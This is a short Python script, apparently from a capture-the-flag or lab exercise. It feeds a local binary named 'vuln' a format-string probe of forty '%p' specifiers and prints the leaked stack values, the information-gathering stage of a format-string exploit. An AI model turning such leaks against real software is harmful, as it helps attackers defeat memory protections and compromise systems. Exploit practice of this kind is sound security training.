import sys, re, subprocess, struct
BIN = "./vuln"
# probe : 40 %p
probe = b"1\n" + b",".join(b"%%%d$p" % i for i in range(1, 41)) + b"\n"
p = subprocess.run([BIN], input=probe, capture_output=True, timeout=30)
out = p.stdout.decode("latin-1")
lines = out.split("\n")
for ln in lines:
    if "0x" in ln:
        parts = ln.strip().split(",")
        for i, v in enumerate(parts, 1):
            print("%2d: %s" % (i, v.strip()))
        break
print("---- raw begin")
print(out[:400])
